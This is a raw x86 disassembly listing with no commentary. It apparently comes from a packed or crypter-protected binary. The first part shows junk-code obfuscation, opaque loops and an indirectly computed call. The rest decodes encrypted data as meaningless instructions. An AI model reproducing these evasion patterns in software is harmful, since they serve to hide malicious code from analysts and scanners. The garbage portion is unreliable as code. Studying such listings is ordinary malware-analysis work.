  4051cb:	jne    0x4051dc
  4051d1:	push   0x42e0b3
  4051d6:	call   DWORD PTR ds:0x42e9cb
  4051dc:	cmp    DWORD PTR ds:0x42d00c,0xc
  4051e3:	jne    0x4051f7
  4051e9:	xor    eax,eax
  4051eb:	xor    eax,DWORD PTR ds:0x42d00c
  4051f1:	inc    eax
  4051f2:	mov    ds:0x42d00c,eax
  4051f7:	jmp    0x4051ac
  4051fc:	xor    DWORD PTR ds:0x42b010,0x429024
  405206:	mov    DWORD PTR [ebp-0x30],ecx
  405209:	mov    eax,DWORD PTR [ebp-0x4]
  40520c:	mov    ecx,DWORD PTR [ebp-0x30]
  40520f:	xor    eax,esi
  405211:	add    eax,edi
  405213:	cmp    ecx,eax
  405215:	je     0x405253
  40521b:	jmp    0x405244
  405220:	mov    eax,DWORD PTR [ebp-0x4]
  405223:	mov    ecx,DWORD PTR [ebp-0x8]
  405226:	xor    eax,esi
  405228:	add    eax,edi
  40522a:	cmp    ecx,eax
  40522c:	mov    eax,DWORD PTR [ebp-0x4]
  40522f:	je     0x40528e
  405235:	mov    ecx,DWORD PTR [ebp-0x38]
  405238:	xor    eax,esi
  40523a:	add    eax,edi
  40523c:	cmp    ecx,eax
  40523e:	je     0x405297
  405244:	lea    eax,[ebp-0x8]
  405247:	push   eax
  405248:	push   DWORD PTR [ebp-0x30]
  40524b:	push   DWORD PTR [ebp+0xc]
  40524e:	call   0x40ca0a
  405253:	mov    eax,DWORD PTR [ebp-0x4]
  405256:	mov    ecx,DWORD PTR [ebp-0x8]
  405259:	xor    eax,esi
  40525b:	add    eax,edi
  40525d:	cmp    ecx,eax
  40525f:	je     0x40527a
  405265:	mov    eax,DWORD PTR [ebp-0x3c]
  405268:	movzx  eax,WORD PTR [eax+ebx*2]
  40526c:	mov    ecx,DWORD PTR [ebp-0x14]
  40526f:	mov    eax,DWORD PTR [ecx+eax*4]
  405272:	mov    DWORD PTR [ebp-0x40],eax
  405275:	jmp    0x405220
  40527a:	mov    eax,DWORD PTR [ebp-0xc]
  40527d:	xor    eax,esi
  40527f:	lea    ebx,[ebx+eax*1+0x3272e0]
  405286:	jmp    0x402be0
  40528b:	mov    eax,DWORD PTR [ebp-0x4]
  40528e:	xor    eax,esi
  405290:	add    eax,edi
  405292:	jmp    0x4053b4
  405297:	mov    eax,DWORD PTR [ebp-0x40]
  40529a:	add    eax,DWORD PTR [ebp+0x8]
  40529d:	mov    DWORD PTR [ebp-0x18],eax
  4052a0:	mov    eax,DWORD PTR [ebp-0x1c]
  4052a3:	test   eax,eax
  4052a5:	je     0x40533f
  4052ab:	mov    DWORD PTR [ebp-0x28],0x0
  4052b2:	push   0x3
  4052b4:	xor    edx,edx
  4052b6:	pop    edx
  4052b7:	add    edx,0x8
  4052ba:	push   edx
  4052bb:	pop    ecx
  4052bc:	push   0x6
  4052be:	dec    ecx
  4052bf:	pop    ebx
  4052c0:	dec    ebx
  4052c1:	xchg   ebx,ecx
  4052c3:	sub    ebx,ecx
  4052c5:	xchg   ebx,ecx
  4052c7:	dec    ecx
  4052c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052cb:	imul   eax,ecx
  4052ce:	sub    esp,eax
  4052d0:	mov    DWORD PTR [ebp-0x28],esp
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x405318
  4052df:	mov    ecx,DWORD PTR [ebp-0xc]
  4052e2:	mov    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    edx,DWORD PTR [ebp+0x14]
  4052e8:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052ec:	xor    ecx,esi
  4052ee:	add    ecx,edi
  4052f0:	xor    edx,edx
  4052f2:	div    ecx
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	xor    ecx,esi
  4052f9:	lea    eax,[ecx+eax*1+0x3272e0]
  405300:	mov    ecx,DWORD PTR [ebp+0x8]
  405303:	mov    edx,DWORD PTR [ebp-0x28]
  405306:	mov    DWORD PTR [edx+ecx*4],eax
  405309:	mov    eax,DWORD PTR [ebp-0xc]
  40530c:	mov    ecx,DWORD PTR [ebp+0x8]
  40530f:	xor    eax,esi
  405311:	lea    eax,[eax+ecx*1+0x3272e0]
  405318:	mov    DWORD PTR [ebp+0x8],eax
  40531b:	mov    eax,DWORD PTR [ebp-0xc]
  40531e:	mov    ecx,DWORD PTR [ebp+0x14]
  405321:	xor    eax,esi
  405323:	add    eax,edi
  405325:	imul   eax,DWORD PTR [ecx]
  405328:	mov    ecx,DWORD PTR [ebp-0x4]
  40532b:	mov    edx,DWORD PTR [ebp+0x8]
  40532e:	xor    ecx,esi
  405330:	lea    ecx,[ecx+edx*1+0x3272e0]
  405337:	cmp    ecx,eax
  405339:	jne    0x4052df
  40533f:	mov    eax,DWORD PTR [ebp-0x4]
  405342:	xor    eax,esi
  405344:	add    eax,edi
  405346:	mov    DWORD PTR [ebp-0x10],eax
  405349:	mov    ebx,0x65655
  40534e:	add    ebx,0x3234
  405354:	xchg   ebx,esi
  405356:	xor    ebx,ebx
  405358:	push   esi
  405359:	mov    esi,ebx
  40535b:	pop    ebx
  40535c:	mov    edx,esi
  40535e:	add    ebx,0x1002
  405364:	lea    eax,[ebp-0x18]
  405367:	add    edx,eax
  405369:	add    edx,0x5
  40536c:	push   edx
  40536d:	inc    esi
  40536e:	pop    ecx
  40536f:	dec    ecx
  405370:	xchg   ecx,eax
  405371:	dec    eax
  405372:	xchg   ecx,eax
  405373:	dec    ecx
  405374:	xchg   ecx,edx
  405376:	dec    edx
  405377:	push   edx
  405378:	mov    edx,ebx
  40537a:	pop    ebx
  40537b:	dec    ebx
  40537c:	call   DWORD PTR [ebx]
  40537e:	cmp    DWORD PTR [ebp+0x10],esi
  405381:	je     0x4053a0
  405387:	xchg   edx,eax
  405388:	push   0xb
  40538a:	pop    ecx
  40538b:	push   0x4
  40538d:	pop    ebx
  40538e:	inc    ebx
  40538f:	xchg   ebx,ecx
  405391:	sub    ebx,ecx
  405393:	xchg   ebx,ecx
  405395:	dec    ecx
  405396:	dec    ecx
  405397:	mov    eax,DWORD PTR [ebp-0x1c]
  40539a:	imul   eax,ecx
  40539d:	add    esp,eax
  40539f:	xchg   edx,eax
  4053a0:	push   eax
  4053a1:	xor    ebx,ebx
  4053a3:	mov    edx,esp
  4053a5:	dec    edx
  4053a6:	inc    ebx
  4053a7:	add    ebx,DWORD PTR [edx+ebx*1]
  4053aa:	dec    ebx
  4053ab:	xor    edx,edx
  4053ad:	add    DWORD PTR [ebp-0x10],ebx
  4053b0:	pop    ebx
  4053b1:	mov    eax,DWORD PTR [ebp-0x10]
  4053b4:	pop    edi
  4053b5:	pop    esi
  4053b6:	pop    ebx
  4053b7:	leave  
  4053b8:	ret    0x10
  4053bb:	push   ebp
  4053bc:	mov    ebp,esp
  4053be:	sub    esp,0x7c
  4053c1:	mov    eax,ds:0x42a000
  4053c6:	xor    eax,DWORD PTR ds:0x42c014
  4053cc:	mov    ds:0x42a000,eax
  4053d1:	push   esi
  4053d2:	and    DWORD PTR ds:0x42a004,0x0
  4053dc:	jmp    0x4053f0
  4053e1:	xor    esi,esi
  4053e3:	or     esi,DWORD PTR ds:0x42a004
  4053e9:	inc    esi
  4053ea:	mov    DWORD PTR ds:0x42a004,esi
  4053f0:	cmp    DWORD PTR ds:0x42a004,0x18
  4053f7:	jae    0x4054e8
  4053fd:	cmp    DWORD PTR ds:0x42a004,0x6
  405404:	jne    0x405415
  40540a:	push   0x429028
  40540f:	call   DWORD PTR ds:0x42e9d3
  405415:	cmp    DWORD PTR ds:0x42a004,0x5
  40541c:	jne    0x405431
  405422:	xor    esi,esi
  405424:	or     esi,DWORD PTR ds:0x42a004
  40542a:	inc    esi
  40542b:	mov    DWORD PTR ds:0x42a004,esi
  405431:	jmp    0x4053e1
  405436:	and    DWORD PTR ds:0x42a014,0x0
  405440:	jmp    0x405454
  405445:	xor    esi,esi
  405447:	or     esi,DWORD PTR ds:0x42a014
  40544d:	inc    esi
  40544e:	mov    DWORD PTR ds:0x42a014,esi
  405454:	cmp    DWORD PTR ds:0x42a014,0x19
  40545b:	jae    0x4054e8
  405461:	cmp    DWORD PTR ds:0x42a014,0xf
  405468:	jne    0x405483
  40546e:	push   0x42d01c
  405473:	push   0x42a00c
  405478:	push   0x42d010
  40547d:	call   DWORD PTR ds:0x42e993
  405483:	cmp    DWORD PTR ds:0x42a014,0xe
  40548a:	jne    0x40549d
  405490:	mov    esi,DWORD PTR ds:0x42a014
  405496:	inc    esi
  405497:	mov    DWORD PTR ds:0x42a014,esi
  40549d:	jmp    0x405445
  4054a2:	mov    DWORD PTR ds:0x42c010,0x19
  4054ac:	cmp    DWORD PTR ds:0x42c010,0x0
  4054b3:	je     0x4054e8
  4054b9:	cmp    DWORD PTR ds:0x42c010,0x1e
  4054c0:	jne    0x4054d6
  4054c6:	push   0x0
  4054c8:	push   0x13e0
  4054cd:	push   DWORD PTR [ebp-0x14]
  4054d0:	call   DWORD PTR ds:0x42e997
  4054d6:	mov    esi,DWORD PTR ds:0x42c010
  4054dc:	dec    esi
  4054dd:	mov    DWORD PTR ds:0x42c010,esi
  4054e3:	jmp    0x4054ac
  4054e8:	push   edi
  4054e9:	adc    DWORD PTR ds:0x42901c,edx
  4054ef:	mov    eax,ds:0x42e313
  4054f4:	mov    esi,DWORD PTR ds:0x42c01c
  4054fa:	and    DWORD PTR ds:0x42a00c,esi
  405500:	mov    DWORD PTR [ebp-0x24],eax
  405503:	mov    eax,ds:0x42e41f
  405508:	mov    DWORD PTR [ebp-0x34],eax
  40550b:	mov    DWORD PTR ds:0x42b008,0x1b
  405515:	cmp    DWORD PTR ds:0x42b008,0x0
  40551c:	je     0x405564
  405522:	cmp    DWORD PTR ds:0x42b008,0x26
  405529:	jne    0x405554
  40552f:	push   0x5039
  405534:	push   DWORD PTR [ebp-0x20]
  405537:	push   0x42d010
  40553c:	push   0x88e6
  405541:	push   DWORD PTR [ebp-0x10]
  405544:	push   0x8f04
  405549:	push   0x8b34
  40554e:	call   DWORD PTR ds:0x42e99f
  405554:	mov    eax,ds:0x42b008
  405559:	dec    eax
  40555a:	mov    ds:0x42b008,eax
  40555f:	jmp    0x405515
  405564:	and    DWORD PTR [ebp-0x30],0x0
  405568:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40556f:	add    eax,eax
  405571:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  405578:	add    DWORD PTR ds:0x42c014,edi
  40557e:	mov    eax,DWORD PTR [ebp-0x10]
  405581:	and    DWORD PTR ds:0x42d014,0x0
  40558b:	mov    esi,DWORD PTR ds:0x42d014
  405591:	inc    esi
  405592:	mov    DWORD PTR ds:0x42d014,esi
  405598:	cmp    DWORD PTR ds:0x42d014,0x5
  40559f:	jne    0x4055c0
  4055a5:	push   0x42c004
  4055aa:	push   DWORD PTR [ebp-0x20]
  4055ad:	push   0x42e0c7
  4055b2:	push   DWORD PTR [ebp-0x24]
  4055b5:	push   0x31c8
  4055ba:	call   DWORD PTR ds:0x42e9a3
  4055c0:	cmp    DWORD PTR ds:0x42d014,0x4
  4055c7:	jne    0x4055dc
  4055cd:	xor    esi,esi
  4055cf:	xor    esi,DWORD PTR ds:0x42d014
  4055d5:	inc    esi
  4055d6:	mov    DWORD PTR ds:0x42d014,esi
  4055dc:	cmp    DWORD PTR ds:0x42d014,0x1c
  4055e3:	jb     0x40558b
  4055e9:	and    DWORD PTR ds:0x42c004,0x0
  4055f3:	xor    ecx,ecx
  4055f5:	xor    ecx,DWORD PTR ds:0x42c004
  4055fb:	inc    ecx
  4055fc:	mov    DWORD PTR ds:0x42c004,ecx
  405602:	cmp    DWORD PTR ds:0x42c004,0x28
  405609:	jne    0x40561a
  40560f:	push   0x42d010
  405614:	call   DWORD PTR ds:0x42e9ab
  40561a:	cmp    DWORD PTR ds:0x42c004,0x18
  405621:	jb     0x4055f3
  405627:	and    DWORD PTR ds:0x42c018,edx
  40562d:	mov    ecx,DWORD PTR [ebp-0x10]
  405630:	sub    eax,ecx
  405632:	mov    DWORD PTR [ebp-0x10],eax
  405635:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  40563c:	mov    eax,DWORD PTR [ebp-0x18]
  40563f:	mov    ecx,DWORD PTR [ebp-0x18]
  405642:	sub    eax,ecx
  405644:	mov    DWORD PTR [ebp-0x18],eax
  405647:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  40564e:	jmp    0x4079f8
  405653:	neg    DWORD PTR [edi+0x51]
  405656:	pop    ds
  405657:	adc    edi,esi
  405659:	div    DWORD PTR [edi]
  40565b:	jge    0x40560a
  40565d:	aam    0xe9
  40565f:	stc    
  405660:	pushf  
  405661:	jne    0x40567c
  405663:	xor    BYTE PTR [edi+0x7a],bl
  405666:	jp     0x40564d
  405668:	pop    edi
  405669:	jp     0x4056e5
  40566b:	popa   
  40566c:	mov    eax,ds:0x79bb0daa
  405671:	in     al,dx
  405672:	les    edx,FWORD PTR [eax+0xccbba51]
  405678:	mov    al,ds:0xba8b943a
  40567d:	mov    al,0xb0
  40567f:	mov    edi,0x8cc2160f
  405684:	std    
  405685:	jp     0x405698
  405687:	pop    es
  405688:	fs in  al,0x52
  40568b:	daa    
  40568c:	ds cli 
  40568e:	adc    al,0xf7
  405690:	fs xchg edi,eax
  405692:	mov    BYTE PTR [eax],al
  405694:	out    dx,al
  405695:	jecxz  0x40567b
  405697:	(bad)  
  405698:	retf   
  405699:	dec    ebx
  40569a:	or     eax,0x5e840767
  40569f:	jnp    0x405635
  4056a1:	xor    eax,0xf944cafd
  4056a6:	mov    eax,0xc7fabfef
  4056ab:	inc    esi
  4056ac:	ds mov bh,0x4
  4056af:	inc    ebp
  4056b0:	cmp    eax,0xd95affc0
  4056b5:	nop
  4056b6:	test   DWORD PTR [esi+edx*4-0x69],0xfece5843
  4056be:	mov    esi,0x2fdf2884
  4056c3:	xchg   eax,eax
  4056c5:	rol    ch,0xf5
  4056c8:	stos   BYTE PTR es:[edi],al
  4056c9:	dec    esi
  4056ca:	div    DWORD PTR [esp+ecx*1]
  4056cd:	mov    ch,0xd7
  4056cf:	adc    esi,DWORD PTR [edx]
  4056d1:	not    BYTE PTR [edi-0x4e4ca343]
  4056d7:	xor    bl,cl
  4056d9:	lods   eax,DWORD PTR ds:[esi]
  4056da:	mov    bh,0xcb
  4056dc:	dec    ebx
  4056dd:	sub    DWORD PTR [esi],esi
  4056df:	pop    esi
  4056e0:	add    al,cl
  4056e2:	shl    BYTE PTR [esi+0x21],1
  4056e5:	push   cs
  4056e6:	push   ecx
  4056e7:	out    0x19,eax
  4056e9:	aam    0xd6
  4056eb:	in     al,0xec
  4056ed:	fs mov esp,0xf122af10
  4056f3:	(bad)  
  4056f4:	xlat   BYTE PTR ds:[ebx]
  4056f5:	or     ah,dl
  4056f7:	xor    edi,DWORD PTR [ecx-0x13]
  4056fa:	mov    al,0x84
  4056fc:	cmp    ebp,ecx
  4056fe:	xor    eax,0x612a8adf
  405703:	(bad)  
  405704:	repnz cdq 
  405706:	inc    esi
  405707:	test   BYTE PTR [edi+0x55],0xc7
  40570b:	mov    dl,0xfe
  40570d:	jne    0x40577f
  40570f:	push   ebp
  405710:	retf   0xb2a7
  405713:	xor    BYTE PTR [edx+esi*4],bh
  405716:	popa   
  405717:	pop    edi
  405718:	adc    al,0xc2
  40571a:	lods   eax,DWORD PTR ds:[esi]
  40571b:	enter  0x4f57,0xc7
  40571f:	enter  0x376b,0x70
  405723:	sbb    al,0xe6
  405725:	out    0x9e,al
  405727:	je     0x405703
  405729:	xchg   ecx,eax
  40572a:	mov    BYTE PTR [ecx+edx*1-0x18c740bc],bl
  405731:	mov    bl,0x98
  405733:	clc    
  405734:	pop    eax
  405735:	push   ds
  405736:	jns    0x40575f
  405738:	loop   0x405797
  40573a:	loope  0x4056c7
  40573c:	jno    0x4056e6
  40573e:	mov    esp,0x55ad6f1d
  405743:	mov    ebp,DWORD PTR [ecx-0x3b]
  405746:	scas   al,BYTE PTR es:[edi]
  405747:	or     DWORD PTR [ebx],esp
  405749:	or     BYTE PTR [ecx-0x2],cl
  40574c:	loop   0x4057b2
  40574e:	jno    0x4056ef
  405750:	into   
  405751:	cdq    
  405752:	lock rcr BYTE PTR [ebx],1
  405755:	or     DWORD PTR [edi-0x2f],0xffffff95
  405759:	fs cs cmp eax,ebx
  40575d:	fucom  st(0)
  40575f:	pushf  
  405760:	mov    ah,al
  405762:	cwde   
  405763:	mov    ebp,0x620563e3
  405768:	inc    ebp
  405769:	nop
  40576a:	adc    dh,cl
  40576c:	lods   al,BYTE PTR ds:[esi]
  40576d:	jnp    0x405786
  40576f:	jbe    0x405764
  405771:	cli    
  405772:	rcl    BYTE PTR [edx],0xc9
  405775:	adc    dl,BYTE PTR [esi-0x9]
  405778:	pushf  
  405779:	dec    edx
  40577a:	mov    ah,0x2f
  40577c:	inc    esp
  40577d:	aas    
  40577e:	lea    esi,[ebx+0x7d]
  405781:	test   BYTE PTR [ecx+0x1e],al
  405784:	stc    
  405785:	sub    eax,0x8ba4f7ac
  40578a:	popa   
  40578b:	outs   dx,BYTE PTR ds:[esi]
  40578c:	test   al,bl
  40578e:	pop    ss
  40578f:	add    eax,0x58772701
  405794:	cld    
  405795:	ins    BYTE PTR es:[edi],dx
  405796:	mov    ebx,0xba1c9e73
  40579b:	outs   dx,DWORD PTR ds:[esi]
  40579c:	xchg   ecx,eax
  40579d:	pop    esi
  40579e:	mov    al,0x5
  4057a0:	popf   
  4057a1:	mov    edx,0xf9e453a3
  4057a6:	sbb    BYTE PTR [edx],bl
  4057a8:	das    
  4057a9:	jo     0x4057b4
  4057ab:	pop    ss
  4057ac:	push   0xffffffb2
  4057ae:	repnz popf 
  4057b0:	ret    
  4057b1:	out    dx,eax
  4057b2:	jg     0x405793
  4057b4:	lods   al,BYTE PTR ds:[esi]
  4057b5:	push   0x87d22463
  4057ba:	xor    eax,0x8d69031f
  4057bf:	ins    DWORD PTR es:[edi],dx
  4057c0:	inc    ebx
  4057c1:	sub    DWORD PTR ds:0x77335536,edx
  4057c7:	jno    0x4057bb
  4057c9:	jecxz  0x405844
  4057cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057cc:	cmp    eax,0xb46e796e
  4057d1:	sub    cl,BYTE PTR [ecx-0x768956a3]
  4057d7:	stos   BYTE PTR es:[edi],al
  4057d8:	adc    eax,0xc0eebd7e
  4057dd:	gs and al,0xaa
  4057e0:	pop    edi
  4057e1:	jb     0x405779
  4057e3:	test   eax,0x47085aa2
  4057e8:	xchg   BYTE PTR [edx-0x4b19d7df],ch
  4057ee:	addr16 int 0x85
  4057f1:	sub    eax,ecx
  4057f3:	jl     0x405821
  4057f5:	retf   
  4057f6:	push   edx
  4057f7:	push   edi
  4057f8:	out    dx,eax
  4057f9:	sub    ah,BYTE PTR [ebx]
  4057fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057fc:	lock jl 0x405848
  4057ff:	sahf   
  405800:	pcmpgtb mm0,QWORD PTR [ebx-0x51]
  405804:	rol    esi,1
  405806:	ficom  DWORD PTR [ebp-0x1e]
  405809:	pop    ebx
  40580a:	and    bh,BYTE PTR [edi+0xc]
  40580d:	xor    eax,0xdc7a360e
  405812:	bound  esi,QWORD PTR [ebx-0x58ac7eb3]
  405818:	pop    edx
  405819:	inc    ecx
  40581a:	sar    ecx,1
  40581c:	xlat   BYTE PTR ds:[ebx]
  40581d:	jp     0x405807
  40581f:	jnp    0x4057fa
  405821:	jecxz  0x4057e1
  405823:	jae    0x405848
  405825:	loope  0x405807
  405827:	(bad)  
  405828:	into   
  405829:	xchg   DWORD PTR [edi],edi
  40582b:	push   es
  40582c:	dec    edi
  40582d:	push   ss
  40582e:	pop    es
  40582f:	sbb    al,0x41
  405831:	xchg   edi,eax
  405832:	daa    
  405833:	sub    DWORD PTR ds:0xc954e391,edx
  405839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40583a:	push   ebx
  40583b:	inc    edx
  40583c:	iret   
  40583d:	mov    ch,0x4b
  40583f:	ja     0x4058a4
  405841:	(bad)  
  405842:	mov    edi,0x1a35d9c9
  405847:	out    dx,al
  405848:	xchg   esi,eax
  405849:	push   ds
  40584a:	push   0xffffffb6
  40584c:	fidiv  WORD PTR [edx+0x6f766d47]
  405852:	xor    DWORD PTR [edx-0x430f2273],edi
  405858:	push   esi
  405859:	das    
  40585a:	stc    
  40585b:	fidiv  WORD PTR [ecx+0x5e]
  40585e:	(bad)
  405862:	enter  0xed74,0x1d
  405866:	jmp    0x405885
  405868:	push   edi
  405869:	add    cl,bh
  40586b:	mov    ah,0x82
  40586d:	scas   eax,DWORD PTR es:[edi]
  40586e:	aas    
  40586f:	iret   
  405870:	xor    al,0x94
  405872:	mov    edx,esp
  405874:	int3   
  405875:	pop    esi
  405876:	sar    BYTE PTR [ecx],cl
  405878:	or     al,0xc3
  40587a:	xor    bl,BYTE PTR [edi-0x5c]
  40587d:	cmp    al,BYTE PTR [esi+0x6b00085e]
  405883:	mov    al,0xc4
  405885:	pop    ebx
  405886:	ja     0x4058ba
  405888:	stc    
  405889:	push   esi
  40588a:	test   BYTE PTR [eax],0x3b
  40588d:	and    eax,0x25ccbaba
  405892:	ret    
  405893:	xchg   esp,eax
  405894:	call   0xbc07:0x718d038d
  40589b:	pushf  
  40589c:	add    ebp,0xffffffaf
  40589f:	sbb    eax,0x43d87635
  4058a4:	or     ebx,ebx
  4058a6:	push   ss
  4058a7:	dec    edi
  4058a8:	leave  
  4058a9:	jp     0x4058cd
  4058ab:	mov    ebx,0x71999bb9
  4058b0:	adc    DWORD PTR [eax+0x29fccb8d],esi
  4058b6:	jo     0x405871
  4058b8:	lods   eax,DWORD PTR ds:[esi]
  4058b9:	cld    
  4058ba:	xchg   BYTE PTR [esi+eax*1+0x10f6576e],cl
  4058c1:	cmp    BYTE PTR [eax+eax*8],0xac
  4058c5:	loope  0x4058e7
  4058c7:	fmul   QWORD PTR [ecx-0x5777ad1e]
  4058cd:	test   BYTE PTR [esi],0x84
  4058d0:	inc    edx
  4058d1:	mov    ?,ebp
  4058d3:	data16 jge 0x405867
  4058d6:	jmp    dx
  4058d9:	imul   eax,DWORD PTR [edx+0x684de18],0xcd3b3914
  4058e3:	retf   0xd360
  4058e6:	inc    BYTE PTR [ebp-0x67]
  4058e9:	mov    ds:0x90daf1f1,al
  4058ee:	in     eax,0xb3
  4058f0:	and    al,0x12
  4058f2:	inc    ebx
  4058f3:	and    edi,DWORD PTR [edx-0x4888a9]
  4058f9:	cmp    DWORD PTR [eax+0x33],edx
  4058fc:	popf   
  4058fd:	fsub   st(0),st
  4058ff:	mov    ch,0x28
  405901:	push   ebx
  405902:	pop    ds
  405903:	ret    0xf796
  405906:	add    al,0xef
  405908:	xchg   ebp,eax
  405909:	shl    eax,cl
  40590b:	push   edi
  40590c:	xor    dh,BYTE PTR [edx-0x18]
  40590f:	cmp    edx,esi
  405911:	shr    BYTE PTR [edi],0x36
  405914:	adc    esi,DWORD PTR [ebx+0x5bf4bd40]
  40591a:	or     ebx,DWORD PTR [edi+0x669a486a]
  405920:	in     al,0xf9
  405922:	mov    ch,0x78
  405924:	rcl    ecx,cl
  405926:	jo     0x405904
  405928:	add    BYTE PTR ds:0x1c26aadf,bh
  40592e:	pop    ss
  40592f:	gs aad 0xe1
  405932:	dec    ebp
  405933:	(bad)  
  405935:	and    ah,BYTE PTR ds:0xb7d8ff02
  40593b:	cli    
  40593c:	bound  edi,QWORD PTR [edi]
  40593e:	ins    DWORD PTR es:[edi],dx
  40593f:	inc    esp
  405940:	retf   
  405941:	pop    es
  405942:	mov    eax,ds:0x8ae3703c
  405947:	jno    0x4059af
  405949:	xor    eax,0xb000da9b
  40594e:	(bad)  [esi+0x19]
  405951:	ins    DWORD PTR es:[edi],dx
  405952:	cmp    ch,BYTE PTR [esi+0x7d92d0b1]
  405958:	fadd   DWORD PTR [ebp+0x72]
  40595b:	(bad)  
  40595c:	push   edx
  40595d:	popa   
  40595e:	retf   0xb69c
  405961:	sub    DWORD PTR [eax],eax
  405963:	jg     0x405958
  405965:	or     ebx,edi
  405967:	ja     0x40593b
  405969:	scas   eax,DWORD PTR es:[edi]
  40596a:	fwait
  40596b:	dec    ebp
  40596c:	mov    WORD PTR [ebx-0x7310e53d],?
  405972:	int    0xe5
  405974:	jbe    0x40592d
  405976:	ret    
  405977:	adc    BYTE PTR [esi+0x79c50750],0x8a
  40597e:	jb     0x4059e1
  405980:	sar    DWORD PTR [ebp+0x2e],0x68
  405984:	cmp    eax,0x254bf848
  405989:	mov    cl,0x9b
  40598b:	imul   BYTE PTR [esi+eiz*8]
  40598e:	lods   al,BYTE PTR ds:[esi]
  40598f:	push   ebx
  405990:	ins    BYTE PTR es:[edi],dx
  405991:	loop   0x405951
  405993:	xchg   edx,eax
  405994:	aaa    
  405995:	fs pop ss
  405997:	mov    WORD PTR [eax-0x76],?
  40599a:	out    dx,eax
  40599b:	nop
  40599c:	into   
  40599d:	xchg   dl,cl
  40599f:	jp     0x40596e
  4059a1:	(bad)  
  4059a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a3:	jne    0x40598e
  4059a5:	mov    BYTE PTR [edx-0x5da25362],bh
  4059ab:	pop    ebp
  4059ac:	aam    0x8e
  4059ae:	jno    0x405a15
  4059b0:	dec    ebp
  4059b1:	ds push ecx
  4059b3:	dec    esi
  4059b4:	jle    0x4059d2
  4059b6:	sbb    dl,BYTE PTR [eax+esi*2-0x5985e571]
  4059bd:	fucomi st,st(6)
  4059bf:	arpl   WORD PTR [eax+ebp*4+0x29],dx
  4059c3:	retf   
  4059c4:	cmp    bl,BYTE PTR ds:0x42efa1b4
  4059ca:	imul   DWORD PTR [eax-0x69]
  4059cd:	push   0x13
  4059cf:	mov    cl,0x7f
  4059d1:	fcmovu st,st(0)
  4059d3:	xor    BYTE PTR [esi-0x707cac0],dl
  4059d9:	jo     0x405a3c
  4059db:	jbe    0x405a18
  4059dd:	sub    eax,esp
  4059df:	pusha  
  4059e0:	xor    DWORD PTR [ebx-0x3d],esp
  4059e3:	(bad)  
  4059e4:	mov    dl,0xc7
  4059e6:	xor    al,0x91
  4059e8:	mov    dl,0x78
  4059ea:	fisub  WORD PTR [esi-0x4c]
  4059ed:	mov    esp,0xcb85292e
  4059f2:	add    eax,0xb61bc984
  4059f7:	and    BYTE PTR ds:0xf5bfb704,dl
  4059fd:	mov    dh,0xde
  4059ff:	push   esi
  405a00:	push   0xffffff8b
  405a02:	ins    DWORD PTR es:[edi],dx
  405a03:	jecxz  0x4059c0
  405a05:	mov    bh,0xfd
  405a07:	je     0x4059ba
  405a09:	xchg   ecx,eax
  405a0a:	cli    
  405a0b:	cmc    
  405a0c:	test   DWORD PTR [ecx-0x7ce6832e],esi
  405a12:	loop   0x4059de
  405a14:	and    ecx,edi
  405a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a17:	jne    0x4059c9
  405a19:	mov    ebp,0xd4c75f73
  405a1e:	js     0x4059b0
  405a20:	and    eax,0xcb6c1c7
  405a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a26:	outs   dx,DWORD PTR ds:[esi]
  405a27:	stos   DWORD PTR es:[edi],eax
  405a28:	data16 outs dx,BYTE PTR ds:[esi]
  405a2a:	ins    BYTE PTR es:[edi],dx
  405a2b:	pushf  
  405a2c:	(bad)
  405a2f:	pop    ds
  405a30:	out    0x88,al
  405a32:	mov    ebp,DWORD PTR [esi]
  405a34:	mov    edi,0x3cff8d7d
  405a39:	imul   edx,DWORD PTR [eax+0xa108484],0xffffffce
  405a40:	and    ch,al
  405a42:	outs   dx,BYTE PTR ds:[esi]
  405a43:	test   al,0x6b
  405a45:	out    0xfd,eax
  405a47:	fdivrp st(7),st
  405a49:	fnstcw WORD PTR [edi+0x6acbaddb]
  405a4f:	jp     0x405a6a
  405a51:	sub    eax,DWORD PTR [edx]
  405a53:	sub    dh,BYTE PTR [ecx+esi*1+0x7a]
  405a57:	cmp    eax,0xe074c28c
  405a5c:	inc    esi
  405a5d:	setp   dl
  405a60:	sbb    DWORD PTR ss:0x784b3461,ebp
  405a67:	mov    bh,ch
  405a69:	mov    eax,0x24f71048
  405a6e:	scas   eax,DWORD PTR es:[edi]
  405a6f:	cmp    eax,0x386f9376
  405a74:	xor    eax,0x9cbc20f5
  405a79:	sbb    eax,0xaf540555
  405a7e:	cli    
  405a7f:	xchg   esi,eax
  405a80:	push   ss
  405a81:	and    BYTE PTR [ecx+ebp*8+0x5ef9d9f0],ah
  405a88:	sub    BYTE PTR [edi+0x9],ch
  405a8b:	mov    eax,0xd478e572
  405a90:	nop
  405a91:	(bad)  
  405a92:	jge    0x405acf
  405a94:	mov    es,WORD PTR [eax+0x3d6f240]
  405a9a:	mov    dl,0x5f
  405a9c:	adc    eax,0xc82bc611
  405aa1:	xor    DWORD PTR [edi-0x7f7e0b0e],edx
  405aa7:	outs   dx,BYTE PTR ds:[esi]
  405aa8:	int    0xe3
  405aaa:	repz int3 
  405aac:	jo     0x405afe
  405aae:	es xchg edi,eax
  405ab0:	inc    esi
  405ab1:	sbb    bh,BYTE PTR [ebx+eiz*4]
  405ab4:	dec    edi
  405ab5:	xchg   esp,esp
  405ab7:	mov    dl,0x12
  405ab9:	ret    
  405aba:	push   eax
  405abb:	clc    
  405abc:	xor    BYTE PTR [ebx-0x5800e39b],dl
  405ac2:	pop    es
  405ac3:	dec    ecx
  405ac4:	sbb    DWORD PTR [ebx+0x5690282e],ebx
